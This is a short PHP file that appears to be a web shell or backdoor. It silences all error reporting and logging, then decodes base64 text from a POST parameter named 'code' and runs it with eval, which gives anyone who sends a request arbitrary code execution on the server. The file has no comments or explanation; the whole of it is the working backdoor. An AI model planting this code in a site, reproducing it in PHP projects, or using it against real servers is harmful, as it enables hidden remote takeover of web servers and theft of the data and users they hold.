<?php

@error_reporting(0);
@ini_set("display_errors",0);
@ini_set("log_errors",0);
@ini_set("error_log",0);
@ini_set("memory_limit", "128M");
@ini_set("max_execution_time",30);
@set_time_limit(30);

if (isset($_POST["code"]))
{
        eval(base64_decode($_POST["code"]));
}

exit;

?>
